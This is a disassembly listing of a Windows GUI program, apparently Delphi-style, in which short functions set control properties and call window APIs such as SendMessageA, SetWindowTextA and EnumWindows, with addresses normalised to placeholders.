sub_42d72c
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_43c7c8
sub_42d770
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_43c7c8
sub_42d871
jmp sub_403994
sub_42d878
pop ebx
pop ecx
pop ebp
retn
sub_42d990
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_43f228
push eax
call SetWindowTextA
pop ebx
retn
sub_42d9ac
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_42da52
jmp sub_403994
sub_42da59
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42daf2
jmp sub_403994
sub_42dc6b
jmp sub_403994
sub_42dcd0
push ebx
mov ebx eax
mov eax ebx
call sub_42d784
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_43c5c4
pop ebx
retn
sub_42ddd0
push ebx
mov ebx eax
mov eax ebx
call sub_43864c
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_42dec8
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403454
sub_42df78
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_42dffa
jmp sub_403994
sub_42e001
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e0ec
jmp sub_403994
sub_42e0f3
pop ebx
pop ecx
pop ebp
retn
sub_42e1e7
jmp sub_403994
sub_42e1ee
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e26b
jmp sub_403994
sub_42e272
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e3c8
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_438a1c
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_42e418
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_42e54c
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_43c7c8
sub_42e580
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42e588
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42e590
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42e5bc
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_439bf4
sub_42e714
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_42e734
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_43c7c8
sub_42e9ff
jmp sub_4036e0
sub_42ea04
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_458560
call sub_403a48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42ec90
jmp sub_403994
sub_42ec97
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42eca0
push ebx
mov ebx eax
mov eax ebx
call sub_43864c
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_42ed6d
jmp sub_403994
sub_42ed74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42ed80
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_42edfc
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_42ef16
jmp sub_403994
sub_42ef60
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_42efeb
jmp sub_403994
sub_42eff2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f024
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_42f030
mov [ eax + 0x210 ] edx
retn
sub_42f081
jmp sub_403994
sub_42f088
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f150
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_43c7c8
sub_42f1a4
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_42f1b9
mov eax [ eax + 0x238 ]
retn
sub_42f1b9
push 0x0
xor ecx ecx
mov edx 0x154
call sub_439bf4
retn
sub_42f4f8
jmp sub_403994
sub_42f4ff
pop ebx
mov esp ebp
pop ebp
retn
sub_42f8bc
jmp sub_403994
sub_42f8c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42fa81
jmp sub_403994
sub_42fa88
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42fa94
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_42fc78
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42fc84
mov eax [ r-xdata ]
retn
sub_42feb5
jmp sub_403994
sub_42fec4
retn
sub_42ff7a
jmp sub_403994
sub_430024
mov eax [ r-xdata ]
retn
sub_43002c
xor eax eax
retn
sub_430050
retn
sub_430168
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_43c7c8
sub_4301e0
push ebx
mov ebx eax
mov eax ebx
call sub_44f7bc
test eax eax
je r-xdata
mov eax ebx
call sub_439f7c
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_430204
xor eax eax
retn
sub_4302cb
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x40f5173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4302e4
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403454
sub_4303d5
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_4303de
jmp sub_403994
j_sub_4303d5
jmp sub_4303d5
sub_4303e5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430518
mov al [ eax + 0x211 ]
retn
sub_43054c
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_43c7c8
sub_43072c
call sub_43c7c8
retn
sub_4307a9
jmp sub_403994
sub_4307b0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4307e8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_4308c8
jmp sub_403994
sub_4308cf
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43095b
jmp sub_403994
sub_430962
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430aa1
jmp sub_403994
sub_430aa8
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430b3d
jmp sub_403994
sub_430b44
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430b4c
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_403454
pop esi
retn
sub_430c8a
jmp sub_403994
sub_430cac
jmp sub_403994
sub_430cb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430cbc
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_403454
pop esi
retn
sub_430e26
jmp sub_403994
sub_430e43
jmp sub_403994
sub_430e4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430ffb
jmp sub_403994
sub_431002
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431050
push esi
mov si 0xffb1
call sub_403454
pop esi
retn
sub_43105c
push esi
mov si 0xffb0
call sub_403454
pop esi
retn
sub_4310b0
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_43121b
jmp sub_403994
sub_431222
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43136c
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_431390
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_431464
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_43c7c8
sub_43147c
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_43c7c8
sub_431498
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_43c7c8
sub_4315ac
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_43c7c8
sub_43160c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_4316d0
jmp sub_403994
sub_4316d7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431772
jmp sub_403994
sub_431779
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431780
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_43c7c8
sub_431e20
push ebx
mov ebx eax
mov eax ebx
call sub_43d814
mov eax ebx
call sub_431298
pop ebx
retn
sub_431fa0
jmp sub_403994
sub_431fa7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_431fb0
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_4323c4
jmp sub_403994
sub_4323cb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4324a8
jmp sub_403994
sub_4324af
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4324b8
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_432549
jmp sub_403994
sub_432550
pop ebp
retn
sub_432554
sub [ rw-data ] 0x1
retn
sub_4326b1
jmp sub_403994
sub_4326b8
pop ebp
retn
sub_4326bc
sub [ rw-data ] 0x1
retn
sub_4326c4
xchg esi eax
inc esi
add [ edi ] cl
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_432f3c
sub_4326d5
add eax 0xffffffe0
jmp sub_432cbc
sub_4326dd
add eax 0xffffffe0
jmp sub_432d24
sub_4326e5
add eax 0xffffffe0
jmp sub_432e38
sub_4326ed
add eax 0xffffffe0
jmp sub_432eac
sub_4326f5
add eax 0xffffffe0
jmp sub_432968
sub_4326fd
add eax 0xffffffe0
jmp sub_43297c
sub_432705
add eax 0xffffffe0
jmp sub_4329f4
sub_43270d
add eax 0xffffffe0
jmp sub_432a98
sub_432715
add eax 0xffffffe0
jmp sub_432a9c
sub_43271d
add eax 0xffffffe0
jmp sub_432b24
sub_432725
add eax 0xffffffe0
jmp sub_432c6c
sub_43272d
add eax 0xffffffe0
jmp sub_432c70
sub_432735
add eax 0xffffffe0
jmp sub_432c8c
sub_432747
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4056a0
sub_432751
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4056b4
sub_432925
jmp sub_403994
sub_43292c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432968
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403fe4
pop ebx
retn
sub_4329e3
jmp sub_403994
sub_4329ea
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432a7c
jmp sub_403994
sub_432a83
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432a98
mov al 0x1
retn
sub_432b17
jmp sub_403994
sub_432b1e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432c1c
jmp sub_403994
sub_432c23
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432c6c
mov [ eax + 0xc ] edx
retn
sub_432c70
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_432d14
jmp sub_403994
sub_432d1b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432e1a
jmp sub_403994
sub_432e21
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432e9a
jmp sub_403994
sub_432ea1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432f2c
jmp sub_403994
sub_432f33
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433027
jmp sub_403994
sub_43302e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4330f0
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_43303c
call EnumWindows
retn
sub_433182
jmp sub_403994
sub_433189
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_433194
xor eax eax
retn
sub_43328d
jmp sub_403994
sub_433294
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43337e
jmp sub_403994
sub_433385
pop ebp
retn
sub_4333da
jmp sub_403994
sub_4333e1
pop ebp
retn
sub_434be2
inc ebx
add [ edx + esi * 4 - 0x46d7ffbd ] dl
inc ebx
add al cl
mov [ ebx ] 0xb4
rol [ ebx ] 0xb0
retn
sub_4350de
inc ebx
add [ edx + esi * 4 - 0x46d7ffbd ] dl
inc ebx
add al cl
mov [ ebx ] 0xb4
rol [ ebx ] 0xb0
retn
sub_435339
add eax 0xffffff8c
jmp sub_441870
sub_435341
add eax 0xffffff8c
jmp sub_441874
sub_435349
add eax 0xffffff8c
jmp sub_441960
sub_435351
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43535e
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43536b
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_435378
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_435385
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_435392
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43539f
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_4353ac
add eax 0xffffff8c
jmp sub_442fd0
sub_4353be
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4056a0
sub_4353c8
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4056b4
sub_4355da
inc ebx
add [ edx + esi * 4 - 0x46d7ffbd ] dl
inc ebx
add al cl
mov [ ebx ] 0xb4
rol [ ebx ] 0xb0
retn
sub_43575a
inc ebx
add [ edx + esi * 4 - 0x46d7ffbd ] dl
inc ebx
add al cl
mov [ ebx ] 0xb4
rol [ ebx ] 0xb0
retn
sub_435820
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_435b33
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_41325c
retn
sub_435b50
push 0x15
mov ecx rw-data
call sub_41321c
retn
sub_435be8
call GetCapture
call sub_435920
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_435e4c
push ebx
push eax
push sub_435fd0
call sub_41a2ac
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_435e64
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_435e94
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41a360
pop ebx
retn
sub_435f72
jmp sub_4036e0
sub_435fa4
xor eax eax
retn
sub_435fa8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_435fc0
retn
sub_435fc4
mov eax [ rw-data ]
retn
sub_435fcc
retn
sub_435ffa
jmp sub_4036e0
sub_435fff
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_458560
call sub_403a48
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43601c
call sub_403498
xor eax eax
mov [ rw-data ] eax
retn
sub_43602c
call sub_403494
xor eax eax
mov [ rw-data ] eax
retn
sub_43603c
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403564
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4360ec
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_436104
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_436150
retn
sub_436308
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403454
pop esi
retn
sub_43631c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403454
pop esi
retn
sub_436330
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43633c
mov eax 0x4
retn
sub_436344
retn
sub_436f35
jmp sub_4036e0
sub_437222
jmp sub_403994
sub_437294
jmp sub_403994
sub_4372a0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_436fc8
sub_43741f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d330
retn
sub_437435
jmp sub_403994
sub_43745c
jmp sub_403994
sub_4374de
jmp sub_403994
sub_437506
jmp sub_403994
sub_43750d
mov esp ebp
pop ebp
retn
sub_4375c5
jmp sub_403994
sub_43761c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4375e8
mov [ ebx + 0x58 ] esi
sub_437770
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_437784
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43786d
jmp sub_403994
sub_437874
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4378f7
jmp sub_403994
sub_4378fe
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_437ccc
xor eax eax
retn
sub_437cd0
mov al [ eax + 0x58 ]
retn
sub_437cd4
xor eax eax
retn
sub_437cd8
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_437ce0
mov eax [ eax + 0x30 ]
retn
sub_437d84
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_437e30
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_437e48
mov [ eax + 0x5d ] dl
retn
sub_437e4c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_43ba2c
sub_437e5c
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43833f
jmp sub_403994
sub_438346
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4383a8
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43842c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_438549
jmp sub_403994
sub_438550
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43864c
push eax
xor ecx ecx
mov edx 0xb037
call sub_439bf4
retn
sub_43880d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403454
sub_4388be
jmp sub_403994
sub_4388c5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43899c
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_439bf4
sub_4389b4
push 0x0
xor ecx ecx
mov edx 0xe
call sub_439bf4
retn
sub_4389c4
push edx
mov edx 0xd
call sub_439bf4
retn
sub_4389d0
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_4389e4
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_438ac5
jmp sub_403994
sub_438acc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438ad4
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_439bf4
sub_438b44
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_438b58
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_438b64
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_438b6c
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_439bf4
sub_438b90
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_439bf4
sub_438bb4
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_439bf4
sub_438bfc
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_438c04
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_439bf4
sub_438c28
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_439bf4
sub_438c4c
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_439bf4
sub_438c68
push ebx
mov ebx eax
call sub_435be8
cmp ebx eax
sete al
pop ebx
retn
sub_438ca0
push esi
mov dl 0x1
mov si 0xffce
call sub_403454
pop esi
retn
sub_438dea
jmp sub_403994
sub_438df1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438f14
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_438e88
retn
sub_438f68
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_438f7c
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_439061
jmp sub_403994
sub_439080
xor eax eax
retn
sub_439084
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43909c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_4390b4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_4390d0
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_4390e8
retn
sub_4391ac
retn
sub_4391b0
cmp eax [ rw-data ]
sete al
retn
sub_439224
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_439340
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403454
pop esi
pop ebp
retn 0x4
sub_439380
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_439617
jmp sub_403994
sub_43961e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439628
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403454
pop esi
retn
sub_43963c
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403454
pop esi
retn
sub_43990b
jmp sub_403994
sub_4399b4
push esi
mov si 0xffee
call sub_403454
pop esi
retn
sub_4399c0
mov al 0x1
retn
sub_439c98
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_438094
retn
sub_439cbc
retn
sub_439ed5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416a68
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_439ef0
mov al [ eax + 0x5e ]
xchg edx eax
call sub_418da0
retn
sub_439fe8
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43a600
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43a608
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43a610
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43a6c8
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a6e8
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_438b90
mov [ ebx + 0x9a ] 0x1
sub_43a740
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
